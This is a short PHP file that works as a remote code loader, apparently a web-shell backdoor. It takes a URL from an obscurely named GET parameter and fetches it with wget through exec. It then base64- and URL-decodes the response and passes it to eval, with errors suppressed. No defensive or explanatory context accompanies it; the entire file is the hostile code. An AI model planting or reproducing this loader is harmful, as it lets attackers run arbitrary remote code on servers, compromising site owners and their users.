<?php
$w = 'https://'.@$_GET['a5fgpiuls97e3x'];
@exec("wget $w -qO-", $m);
$j = base64_decode($m[0]);
$e = urldecode($j);
$z = '?>';
$p = $z.$e;
eval($p);
?>
